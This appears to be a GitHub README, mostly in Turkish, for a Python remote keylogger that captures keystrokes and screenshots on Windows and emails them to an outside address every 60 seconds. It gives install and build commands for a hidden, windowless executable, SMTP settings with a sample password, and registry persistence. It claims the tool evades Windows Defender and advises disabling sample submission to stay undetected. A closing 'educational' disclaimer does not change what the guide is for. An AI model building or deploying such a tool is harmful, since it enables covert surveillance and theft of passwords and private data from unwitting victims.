# Gngr_remote_keylogger
(On 09/04/2021) Remote Keylogger software has been made for the latest up-to-date "Windows 7, 8 and 10" operating system. It managed to circumvent the "Windows Defender" program.

(Windows 7, 8 ve 10 gibi) Güncel Windows işletim sistemlerinde çalışan ve Defender gibi güvenlik programlarına yakalanmayan "Remote keylogger" programı yazılması hedeflenmiştir. 09/04/2021 tarihi itibarıyla gerçekleştirilmiştir. Güncellemelerle beraber zamanla bu durum değişebilir.

Kaynak kodun derlenmiş çalışır hali ile ilgili video https://www.youtube.com/watch?v=7zq-eTPeRbY adresinden izlenebilir.



Gereksinimler
---------------
1) Gerekli kütüphaneler: PyWin32, pynput, pyautogui, pyinstaller

Yüklemek için;

>> pip install PyWin32

>> pip install pyautogui

>> pip install pyinstaller

"pyinstaller" kodu tek parça çalıştırılabilir dosya haline getirmek için kullanılacak


2) Ayrıca kullanılacak e-mail adresinin smtp protocol ayarlarının yapılması, çalışıp çalışmadığının kontrol edilmesi gereklidir. E-maillin çalışma kontrolü https://github.com/abdulkadir-gungor/python_smtp adresindeki python scripti ile yapabilirsiniz.


Örnek olması açısından Gmail için şu ayarların yapılması gereklidir.

[A]

![n1](https://user-images.githubusercontent.com/71177413/114177831-877f6b80-9945-11eb-9dda-0734fa49f057.JPG)


[B]

![n2](https://user-images.githubusercontent.com/71177413/114177861-9108d380-9945-11eb-9c95-f27bc86eb56f.JPG)


[C]

![n3](https://user-images.githubusercontent.com/71177413/114177893-9e25c280-9945-11eb-88e9-3221d73fc9f5.JPG)


[D]

![n6](https://user-images.githubusercontent.com/71177413/114177969-b8f83700-9945-11eb-8ff9-07cc04f1db11.JPG)


Kaynak Kod
---------------
Keylogger kodlanırken "Python 3.8.5" kullanıldı. Program çalışırken; klavye log kayıtlarını ve ekran görüntülerini girilen e-mail adresine
ayarlanan zaman aralıklarında (varsayılan 60 sn bir) gönderilmektedir.

keylogger.py ==> Hem ekran görüntüsünü hem de klavyedeki basılan tuşları 1 dk arayla girilen e-mail adresine gönderir. Ana derlenecek kaynak dosyası budur.

SMTP_Email.py ==> Email göndermek için kullanılacak sınıfları içerir.


Kaynak Kod Ayarları
---------------------
"keylogger.py" dosyasında 105. ve 110. satırlar arasında bulunan değişkenler, gerekli şekilde ayarlanmalıdır.
    
    SEND_MAIL_SECOND = 60                           # Gönderilecek e-mail süre aralığı, (varsayılan 60 sn)
    SMTP_ADDR = 'smtp.gmail.com'                    # SMTP Adresi
    PORT = 587                                      # SMTP Protokolunun portu
    SENDER = 'sender.test.gungor.abc@gmail.com'     # SMTP protokol ayarları yapılmış, kontrol edilmiş e-mail adresi
    PASSWORD = 'q123aSd456z'                        # SMTP ayarları yapılmış e-mail adresinin şifresi
    MAIL_TO = 'receiver.test.gungor.abc@gmail.com'  # E-mail gönderilecek adres (SMTP ayarları yapılmış olan e-mail olabileceği gibi farklı e-mail adresi de yazılabilir.)
    
![n5](https://user-images.githubusercontent.com/71177413/114186529-a3880a80-994f-11eb-9d78-76f6d8f8774a.JPG)


    
Önemli Notlar
---------------
"pynput" gibi hazır kütüphane kullanılmamıştır. Tarafımdan klavye fonksiyonu yazılmıştır. Klavye fonksiyonu, "Türkçe Q Klavye"ye göre yazılmıştır. Eğer herhangi farklılık yaşamanız durumda ilgili klavye fonksiyonundan düzeltebilirsiniz. Detaylı bilgi için "https://docs.microsoft.com/tr-tr/dotnet/api/system.windows.forms.keys?view=net-5.0" adresine bakınız.

Kalıcılık için regedit girdisi kullanılmış olup, "wmic service" gibi daha agresif methodlar kullanılmamıştır. Farklı amaçlarla kullanılmaması için özellikle regedit kullanılmış olup, program "remote keylogger" olacak şekilde dizayn edilmiştir.


Kaynak Kodu Derlemek İçin
----------------------------
>>pyinstaller --onefile --noconsole --icon=keyboard.ico keylogger.py

Aşağıda PyCharm programı üzerinde nasıl derlendiği resim olarak gösterilmektedir.

[1] Derleme işlemi

![n1](https://user-images.githubusercontent.com/71177413/114182010-d8459300-994a-11eb-826e-ae197934a8f5.JPG)


[2 - Kaynak Kodun Derlenmiş Hali] Oluşturulan dist klasörü içerisinde kaynak kodun derlenmiş hali bulunur.

![n3](https://user-images.githubusercontent.com/71177413/114182071-e72c4580-994a-11eb-8855-f19eb20b001e.JPG)


Keylogger Yazılımını, Sanal ve Gerçek İşletim Sistemlerinde Deneme
----------------------------------------------------------------------------
Windows 7, 8 , 10 işletim sistemlerinde sorunsuz şekilde çalıştı. Özellikle tüm güncelleştirmeleri yapılmış işletim sistemleri seçildi. Ayrıca Defender ve Virüs tarama programı bulunan cihazlarda sorunsuz çalıştığı gözlemlendi.


[1]

![a1](https://user-images.githubusercontent.com/71177413/114182924-e8aa3d80-994b-11eb-8b4b-bcd7f5535d40.jpg)


[2]

![a2](https://user-images.githubusercontent.com/71177413/114183040-feb7fe00-994b-11eb-98b7-59441454e24b.jpg)


[3]

![a3](https://user-images.githubusercontent.com/71177413/114183095-05df0c00-994c-11eb-9fc0-7953b57b892b.jpg)


[4]

![a4](https://user-images.githubusercontent.com/71177413/114183136-0c6d8380-994c-11eb-80ac-a7c8859acc76.jpg)


[5]

![a5](https://user-images.githubusercontent.com/71177413/114183206-18594580-994c-11eb-85fa-50e0690dbd9c.jpg)


Windows Defender İle Taratılma Sonucu
----------------------------------------------
Programın çalışması sırasında herhangi bir uyarı ile karşılaşılmadı. İlgili programın konumu gösterilerek, özellikle güncel Windows Defender ile taratılmıştır. "09/04/2021" tarihi itibarıyla Defender programı herhangi bir uyarı vermemiştir. Güncellemelerle beraber zamanla bu durum değişebilir. 

Özellikle Defender ayarlarında örnek numune gönderme kapalıdır. Defender imzasız olan ve sistem kaynaklarına erişen (zararlı olsun ya da olmasın) tüm yazılımları merkeze gönderir. Eğer bu ayar açık olursa keylogger veritabanına kayıt edilerek 1 ya da 2 hafta içerisinde yakalanmaya ya da uyarı vermeye başlar.


[1]

![a8](https://user-images.githubusercontent.com/71177413/114183799-bd741e00-994c-11eb-8de4-210d530ce5ea.jpg)


[2]

![a9](https://user-images.githubusercontent.com/71177413/114184174-33788500-994d-11eb-9ee4-3408a906d13f.jpg)


[3]

![a6](https://user-images.githubusercontent.com/71177413/114184404-75a1c680-994d-11eb-9ff6-6f57114d46f7.jpg)


[4]

![a7](https://user-images.githubusercontent.com/71177413/114184348-66227d80-994d-11eb-83ce-51c56b5185c8.jpg)


Yasal Uyarı
----------------
Eğitim amacıyla hazırlanmıştır. 

Kullanıcıların bazı kullanım şekilleri suça sebep olabilir.

Olumsuz durumlarla karşılaşmamak için "Yasal_Uyarı.txt" dosyasını okuyunuz.

